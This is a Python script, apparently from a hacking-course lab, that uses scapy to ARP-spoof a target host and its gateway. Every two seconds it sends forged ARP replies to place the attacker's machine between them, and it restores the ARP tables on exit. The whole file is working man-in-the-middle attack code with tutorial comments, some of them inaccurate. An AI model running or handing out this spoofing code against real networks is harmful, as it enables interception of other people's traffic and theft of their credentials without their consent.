#!/usr/bin/env python

import scapy.all as scapy
import time


def get_mac(ip): #Simply extracts mac address
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request #the slash combines the two into a single variable
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip): #this function does the spoofing
    target_mac = get_mac(target_ip) #calls get_mac function to set the target
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #creating packet to send which will cause the spoof
    scapy.send(packet, count=4, verbose=False) #count is used to instruct the code sent the packet

#restore function is used to restore arp values to normal on target and hacker computer. it spoofs backwards
def restore(destination_ip, source_ip): #destinatip_ip is victim, source_ip is my ip (source where ip is coming from)
    destination_mac = get_mac(destination_ip) #this line and line below call get_mac function to set the destination and source mac's
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False) #count is used to instruct the code sent the packet


target_ip = "10.0.2.9" #Changes depending on network scan
gateway_ip = "10.0.2.2" #Router IP

try: #this is a loop because it continuously has to keep spoofing ip's
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip) #this line and line below call spoof function
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2 #adding two integer by 2 each time loop runs because it sends 2 packets each run through (one to router, one to victim)
        print("\r\r[+] Packets Sent: " + str(sent_packets_count)), #comma at the end is used to tell the code what to print
        time.sleep(2) #adds a 2 second delay between each run of loop

except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ...... Resetting ARP Tables...... Please Wait\n") #"\n" ends the line and starts a new one
    restore(target_ip, gateway_ip) #this line and line below call the restore function
    restore(gateway_ip, target_ip)
